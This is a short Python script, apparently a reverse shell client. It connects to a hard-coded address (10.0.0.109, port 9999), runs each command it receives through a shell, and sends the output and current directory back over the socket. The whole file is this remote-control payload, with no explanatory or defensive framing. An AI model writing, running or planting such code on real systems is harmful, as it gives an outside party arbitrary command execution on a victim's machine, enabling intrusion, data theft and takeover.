import os
import socket
import subprocess


s=socket.socket()
host='10.0.0.109'
port=9999

s.connect((host,port))

while True:
      data=s.recv(1024)
      if data[:2]=='cd':
            os.chdir(data[3:])
      if len(data)> 0:
            cmd=subprocess.Popen(data[:],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            output_bytes=cmd.stdout.read()+cmd.stderr.read()
            output_str=str(output_bytes)
            s.send(str.encode(output_str+str(os.getcwd()+"$")))


s.close()              
